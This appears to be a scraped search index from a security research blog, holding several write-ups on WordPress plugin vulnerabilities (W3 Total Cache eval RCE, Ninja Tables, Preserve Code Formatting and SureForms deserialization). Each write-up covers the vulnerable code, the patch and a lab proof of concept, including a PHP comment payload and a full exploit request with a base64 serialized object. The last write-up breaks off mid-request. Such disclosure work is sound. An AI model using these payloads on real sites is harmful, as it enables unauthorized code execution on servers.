--\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is → Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes → shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‑end page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is → Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes → shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rInstall and activate the plugin. Enable Page Cache. Configure W3TC_DYNAMIC_SECURITY in wp-config.php. Comment on any post: \u003c!-- mfuncvalue --\u003ephpinfo();\u003c!-- /mfuncvalue --\u003e Result\rNOTE The value of W3TC_DYNAMIC_SECURITY may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it. Used when Page Cache is forgotten to be enabled\r","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-9501 arises because W3 Total Cache executes PHP in “dynamic fragment caching” (\u003c!-- mfunc ... --\u003e) via eval() without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during shutdown(), after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the eval() call, fixing the vulnerability. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rUsing eval() in production code almost always results in RCE if input is uncontrolled. The plugin processes dynamic content after the full WordPress lifecycle, bypassing many core protections. W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks. RCE triggers in register_shutdown_function(), executing at the end of the request, making detection harder. Immediate plugin update is mandatory for systems using \u003c= 2.8.12. Avoid eval() in PHP unless strictly sandboxed and validated. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCommand Injection WordPress W3 Total Cache Plugin \u003c 2.8.13 is vulnerable to Remote Code Execution (RCE) ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables – Easy Data Table Builder Plugin.","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe WordPress plugin Ninja Tables – Easy Data Table Builder contains a PHP Object Injection vulnerability in all versions up to 5.0.18, due to unsafe deserialization of user-provided data from the parameter args[callback]. This allows an unauthenticated attacker to supply a malicious PHP object. CVE ID: CVE-2025-2939 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Tables – Easy Data Table Builder Plugin ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Ninja Tables – Easy Data Table Builder: 5.0.18 – vulnerable 5.0.19 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v5.0.18): $callback = unserialize(base64_decode($params['callback'])); In this code, the unserialize() function is executed directly on user input ($params['callback'] after base64 decoding). This introduces a severe vulnerability: Object Injection Risk: If an attacker injects a serialized PHP object in base64 form, decoding and unserializing the data will instantiate the malicious object, leading to Object Injection and potential Remote Code Execution (RCE). Lack of Input Validation: No validation of the data is performed before calling unserialize. No fallback mechanism: If the supplied data is invalid or malicious, no error-handling or safe alternative exists, increasing exploitability. Patched version (v5.0.19): Patch change\runserialize() was replaced with json_decode(): Removing unserialize() eliminates the possibility of PHP Object Injection. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rgetCallback() is invoked inside the registerAsyncRequestHandler() function: public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); ... }); } The function registers an Ajax endpoint for unauthenticated users (admin_post_nopriv_) and retrieves the action value using makeAsyncRequestAction(): protected static function makeAsyncRequestAction() { return 'wpf-async-request-'.sha1( App::config()-\u003eget('app.slug') ); } This returns \"wpf-async-request-\" concatenated with the SHA1 hash of the plugin slug. Since the plugin slug is ninja-tables, the final value becomes: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 $params contains all data within args[...] from the request, after removing the control fields (action, args.url, args.method). =\u003e When a request is sent to /wp-admin/admin-post.php with action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77, then getCallback($params) is executed. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated → RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated → RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated → RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated → RCE\"]\r","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a class for testing in wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Let the request pass through BurpSuite proxy Resend the request with args[callback] containing a serialized payload encoded in base64 args[callback] = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:4:\"ls /\";}') GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1 Host: localhost Kết quả\r","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions \u003c= 5.0.18 of the Ninja Tables plugin handle the args[callback] parameter insecurely, executing unserialize() on user input without any validation. This allows an unauthenticated attacker to supply a serialized object payload and achieve code execution on the server. The 5.0.19 update completely removes the use of unserialize() and replaces it with json_decode, fully resolving the issue. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\runserialize() must not be used on client-supplied input without validation. The Ajax hook admin_post_nopriv_* exposes an attack surface to unauthenticated users. A single crafted HTTP request is enough to trigger exploitation. Version 5.0.19 correctly mitigates the issue by switching to a safer format such as JSON. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Ninja Tables – Easy Data Table Builder Plugin \u003c= 5.0.18 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Preserve Code Formatting Plugin.","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Deserialization of Untrusted Data vulnerability in Scott Reilly’s Preserve Code Formatting plugin (preserve-code-formatting) allows Object Injection. This issue affects Preserve Code Formatting versions from n/a up to \u003c= 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 5.0 CVSS Severity: High (8.8) Required Privilege: Contributor Product: WordPress Preserve Code Formatting Plugin ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Preserve Code Formatting: 4.0.1 – vulnerable 5.0 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v4.0.1): $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); In this code, the unserialize() function is executed directly on user-supplied input ($match[2] after Base64 decoding). This introduces a critical vulnerability: Object Injection risk: If an attacker injects a malicious serialized PHP object encoded in Base64, decoding and unserializing will instantiate the malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). No validation: There are no checks in place to validate the data before calling unserialize(). No fallback mechanism: If the data is malformed or fails to decode, the application does not handle errors safely, increasing exploitability. Patched version (v5.0): Patch changes\runserialize() was replaced with json_decode(): $decoded_data = str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $matches[2] ) ) ); if ( ! $this-\u003eis_content_safe( $decoded_data ) ) { return $matches[0]; } $data = json_decode( $decoded_data, true ); if ( $data === null \u0026\u0026 json_last_error() !== JSON_ERROR_NONE ) { $data = $decoded_data; } Removing unserialize() completely eliminates the possibility of PHP Object Injection. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin registers the following filter: add_filter( 'content_save_pre', array( $this, 'preserve_postprocess' ), 100 ); The content_save_pre hook is executed before a post’s content is written to the database. This makes it an ideal point to modify or filter content. When triggered, the callback preserve_postprocess is executed: public function preserve_postprocess( $content, $preserve = false ) { $options = $this-\u003eget_options(); $preserve_tags = (array) $options['preserve_tags']; $wrap_multiline_code_in_pre = (bool) $options['wrap_multiline_code_in_pre']; $result = ''; foreach ( $preserve_tags as $tag ) { if ( $result ) { $content = $result; $result = ''; } $codes = preg_split( \"/(\\\\{\\\\!\\\\{{$tag}[^\\\\]]*\\\\}\\\\!\\\\}.*\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); foreach ( $codes as $code ) { if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { // Note: base64_decode is only being used to decode user-supplied content of code tags which // had been encoded earlier in the filtering process to prevent modification by WP. $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); if ( $preserve ) { $data = $this-\u003epreserve_code_formatting( $data ); } $code = \"\u003c{$match[1]}\u003e$data\u003c/$tag\u003e\"; if ( $preserve \u0026\u0026 $wrap_multiline_code_in_pre \u0026\u0026 ( 'pre' != $tag ) \u0026\u0026 preg_match( \"/\\n/\", $data ) ) { $code = '\u003cpre\u003e' . $code . '\u003c/pre\u003e'; } } $result .= $code; } } return $result; } Set a breakpoint at the beginning of preserve_postprocess() and create a new post: POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1 Host: localhost Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953 ... {\"id\":129,\"content\":\"\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003ePayload\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\",\"title\":\"Test\",\"status\":\"pending\"} Value of $content\r$content matches the value supplied in the \"content\" field. $codes = preg_split( \"/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); This regex locates the custom preserve tag blocks {!{$tag}...}!} and their matching closing tags. PREG_SPLIT_DELIM_CAPTURE ensures the matching blocks are preserved in the output array. Value of $tag\rIf $tag is code or pre, the preserve sections will be extracted; otherwise, the original content remains unchanged. if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { ... } preg_match() checks for a preserve block within $code. $match[1] → tag or attributes $match[2] → block content Value of $match\r$data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); Finally, $match[2] is Base64 decoded, stripped, cleaned, and then passed into unserialize(). As described in the CVE, exploitation requires Contributor privileges to create a post. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\r","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Create a post and intercept the request using Burp Suite. Resend the request with the \"content\" field containing the serialized and Base64-encoded payload: Result\r","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions \u003c= 4.0.1 of the Preserve Code Formatting plugin are critically vulnerable because unserialize() is called on unvalidated user input. With only Contributor privileges, an attacker can inject a malicious payload that is deserialized during post processing, leading to remote code execution or unauthorized system manipulation. The v5.0 patch eliminates unserialize(), replaces it with json_decode(), and adds input validation, effectively neutralizing the Object Injection attack surface. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rUsing unserialize() on user-controlled data is fundamentally unsafe without strict validation. The content_save_pre hook exposes an attack surface because input is processed before sanitization. Contributor privileges are sufficient to exploit the issue in multi-user environments. The patch focuses on switching to safe data handling and applying content validation. Replacing unserialize() with safer mechanisms like JSON is the correct fix for WordPress plugins facing similar issues. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Preserve Code Formatting Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress SureForm Plugin.","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe SureForms – Drag and Drop Form Builder for WordPress plugin for WordPress contains a PHP Object Injection vulnerability in all versions up to and including 1.7.3 due to the usage of file_exists() in the delete_entry_files() function without restricting the provided path. This allows an unauthenticated attacker to inject a PHP Object. No POP chain is known in the vulnerable software, meaning the vulnerability has no impact unless another plugin or theme installed on the site contains a POP chain. If such a POP chain exists via additional plugins or themes installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, sensitive data exposure, or code execution depending on the POP chain present. CVE ID: CVE-2025-6742 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 1.7.3 Patched Versions: 1.7.4 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress SureForm Plugin ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - SureForm: 1.7.3 – vulnerable 1.7.4 – patched Diff Tool (diff) → Meld or any diffing tool. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn version 1.7.3, the function delete_entry_files() receives a $file_url, then decodes the URL and converts it into a path using $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); It then directly calls: // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } This code checks for file existence using file_exists() and uses unlink() to delete it if present. Changes in the patch\rIn the patched version, the code is replaced with: // Delete the file from the uploads directory. Helper::delete_upload_file_from_subdir( $file_url, 'sureforms/' ); public static function delete_upload_file_from_subdir( $file_url, $subdir = 'sureforms/' ) { // Decode the file URL. $file_url = urldecode( $file_url ); // Check if the file URL is empty. if ( empty( $file_url ) || ! is_string( $file_url ) ) { return false; } // Normalize and sanitize the subdirectory. $subdir = trailingslashit( sanitize_text_field( $subdir ) ); // Get the base upload directory. $upload_dir = wp_upload_dir(); $base_upload_path = trailingslashit( $upload_dir['basedir'] ) . $subdir; // Extract only the filename from URL. $filename = basename( $file_url ); // Construct the full file path. $file_path = $base_upload_path . $filename; // Resolve real paths. $real_file_path = realpath( $file_path ); $real_base_path = realpath( $base_upload_path ); // Security check: ensure file is inside the target subdir. if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) { return false; } // Delete if file exists. if ( file_exists( $real_file_path ) ) { return unlink( $real_file_path ); } return false; } The new function delete_upload_file_from_subdir() performs multiple security checks, only allowing deletion of files located in the uploads/sureforms/ directory with valid filenames. According to the description, this CVE is related to a PHP Object Injection vulnerability where the sink is the file_exists() function, which only occurs in the case of PHAR Deserialization, meaning $file_path must be in the format phar://phar_file.\r","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rpublic static function delete_entry_files( $entry_id ) { if ( ! $entry_id ) { return; } // Get the entry data to get the file URLs. $form_data = Entries::get_form_data( $entry_id ); if ( empty( $form_data ) ) { return; } foreach ( $form_data as $field_name =\u003e $value ) { // Continue to the next iteration if the field name does not contain 'srfm-upload' and value is not an array. if ( false === strpos( $field_name, 'srfm-upload' ) \u0026\u0026 ! is_array( $value ) ) { continue; } foreach ( $value as $file_url ) { // If the file URL is empty, skip to the next iteration. if ( empty( $file_url ) ) { continue; } $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } } } ... } After reviewing the logic in delete_entry_files(), I noticed keywords like entries appear frequently. There is a coincidence here: Entry in UI\rIt seems correct, but as you can see the message \"No records found\", there is no data to display. So how do we add data? $form_data = Entries::get_form_data( $entry_id ); Looking at the function name get_form_data, it is highly likely that data is retrieved from client form submissions since this vulnerability is published as Unauthenticated. Try creating a form using the plugin functionality: Create form\rCreate a post and embed the form shortcode: Embed Shortcode\rAccess the created form and submit arbitrary data: POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 